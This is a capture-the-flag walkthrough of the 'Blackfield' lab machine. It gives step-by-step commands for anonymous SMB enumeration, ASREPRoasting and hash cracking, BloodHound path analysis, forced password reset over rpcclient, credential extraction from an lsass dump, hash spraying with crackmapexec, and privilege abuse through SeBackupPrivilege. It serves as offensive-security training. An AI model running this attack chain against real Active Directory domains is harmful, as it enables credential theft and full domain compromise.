## Skills covered

- SMB Enumeration (Enumerating users via anonymous login)
- ASREPRoasting (Kerberos Pre-Authentication disabled)
- Lsass Process Dump Analysis
- Using WinRM Privileges
- Abusing Backup Operators Privileges
- Enumerating a domain using Bloodhound
- Use of RPCClient

## Enumeration

Begin by running an `nmap` scan of the IP address.
`sudo nmap -sV -p- -A 10.10.10.192`

This scan indicates that port 53 (DNS), 389 (LDAP), and 445 (SMB) are open. The scan results also show the hostname is `DC01` and the related domain is `BLACKFIELD.LOCAL` Because of this, it is highly likely that this server is the domain controller for the `BLACKFIELD.LOCAL` domain.

As SMB port 445 is open, a good next step would to be check for anonymous/guest access, and attempt to map the shares if it is open.
`smbmap -H 10.10.10.192 -u guest`

The result of the `smbmap` scan shows that guest access **is available**. The scan also lists available shares and the associated privilege level. In this case, there are 2 non-default shares that have read access for the guest user - `profiles$` and `forensic`

The command `smbclient -N \\\\10.10.10.192\\profiles$ -c ls` will connect to the SMB service, and run the `ls` command on the `profiles$` share. This will list the files available on the share. After running this command, the output suggests the `profiles$` share contains the user directories for each user on the domain. Use the following command to extract all of these usernames and output them to a text file for later use. 
`smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }' > users.txt`

## ASREPRoasting

After extracting a list of usernames from the server, it is a good idea to check for accounts with Kerberos Pre-Authentication disabled. If there are any found, it is possible to extract the password hash, which can then be bruteforced to uncover the user's password.

`GetNPUsers.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) can be used to run this attack. The following command will iterate across the `users.txt` username list extracted from the `profiles$` share and attempt ASREPRoasting automatically.

`python3 GetNPUsers.py blackfield.local/ -no-pass -usersfile /home/kali/users.txt -dc-ip 10.10.10.192`

This will output mostly errors due to accounts not being found, or having pre-authentication enabled. However, the `support` account outputs a hash as seen below. This hash can now be bruteforced using either John or Hashcat and the `rockyou.txt` wordlist.

`$krb5asrep$23$support@BLACKFIELD.LOCAL:185afdd048d3b19c5059d658ff882ffc$fc62d426fa4af49ca9d138c055a69291de98454ae1fc224c5a45f7ef7515eb0ff6a516926957db3a5e1f25c6cfe9c00f5795ad416f369e324a506e2c05521db2541f3f40a040b910ca56af93d74d69b70f21dac55e0186158df78c05cb85e2bde124e467e9e74e850c9b8a1a2aa6ee46ac0b68e31c95b1f49c233876543d09acca6cff3eb1c84f7f5e73f46de443da8729028615087e7eaa0fc0b12fa5e58bbe9ab4fd5f38d0ae95d1da493e07c0c8d91a38e91c5f1f5fd7757786df8f1208c85f0ee9f8d9aee253e7a47bd426476162ac0a2d2ff74604b12113d4aa038fd2062267c576ad00365856948a13af70aaa42a722dcd`

Put this hash into a file, such as `~/hash.txt`. Then crack the hash using `john` and the `rockyou.txt` wordlist. (The wordlist may be compressed, decompress it using `gunzip`)

`john ~/hash.txt -w=/usr/share/wordlists/rockyou.txt`

`john` outputs that the password is `#00^BlackKnight`.

## Enumerating the domain using Bloodhound

If `bloodhound` is not already installed, it can be using:

```
sudo apt-get install bloodhound
pip3 install bloodhound
```

**NOTE:** `bloodhound` and `bloodhound-python` are different packages. Install them both.

Using the freshly extracted credentials, execute the `bloodhound-python` data collector using the following command

`bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly`

This will create multiple files:

```
20221124194526_computers.json
20221124194526_domains.json
20221124194526_groups.json
20221124194526_users.json
```

If this is the first launch of `bloodhound`, there are some prerequisites. Run the following commands, and then login to the database Web UI at `https://localhost:7474` using the credentials `neo4j / neo4j`

```
mkdir -p /usr/share/neo4j/logs
touch /usr/share/neo4j/logs/neo4j.log
sudo neo4j start
bloodhound
```

If this is not the first launch, just run `sudo neo4j start` and then `bloodhound`.

Drag and drop the files created by `bloodhound-python` into bloodhound to import the data. Begin analysis by searching for `support` (the account we have compromised) and right click it to mark as owned.

Click 'Raw Query' at the bottom of bloodhound and run the following query to search for objects in the 1st degree (i.e. 1 hop away) that our owned user can control.

`MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p`

This command shows that the owned `support` user can `ForceChangePassword` the `audit2020` user. This privilege can be abused using `rpcclient`.

`rpcclient -U blackfield/support 10.10.10.192`

Once connected, change the `audit2020` user password using the following command:

`setuserinfo audit2020 23 P@s5w0rd`

## Enumerating shares as the next user.

With the new `audit2020` account, new SMB privileges may have been exposed. This can be confirmed by running `smbmap` again as the  `audit2020` account. 

`smbmap -H 10.10.10.192 -u audit2020 -p P@s5w0rd`

`smbmap` shows that this account has read access to the forensic share, which was not available on the `support` account.

Connect to the SMB share with the following commands and `smbclient.py` from Impacket

```
python3 smbclient.py audit2020:'P@s5w0rd'@10.10.10.192
use forensic
```

There is a directory called `memory_analysis` containing a file called `lsass.zip`. At this point, it can be assumed that this is an lsass.exe dump, which will contain password hashes. Download `lsass.zip` using the following commands:

```
cd memory_analysis
ls
get lsass.zip
exit
```

Unzip `lsass.zip` and run [pypykatz](https://github.com/skelsec/pypykatz) on it.

```
pip3 install pypykatz
pypykatz lsa minidump lsass.DMP
```

This will provide a dump of password hashes. Assuming the account lockout policy is 0 (unlimited), a spray attack will allow us to attempt to find a combination of usernames and passwords to login. Lockout Policy can be tested using the following command:

```
ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H "ldap://10.10.10.192" -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold
```

This should return `lockoutThreshold: 0` if there is no lockout policy. This confirms a password spray attack is possible.

To extract the usernames and hashes from the `lsass.dmp` file, run the following commands:

```
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes

pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
```

Then, to run the spray attack:

```
crackmapexec smb 10.10.10.192 -u users -H hashes
```

The password spray attack should return a hash that can used to attempt an Evil-WinRM session. It is always good to check if WinRM is enabled by using Evil-WinRM because this will immediately provide a shell as that user.

Running `whoami /priv` in this shell will show the users permissions. An important permission to note is `SeBackupPrivilege`. This permission can be abused using `robocopy` to copy the Administrator user folder to the C:/ drive.

```
robocopy /b C:\Users\Administrator\Desktop\ C:\
```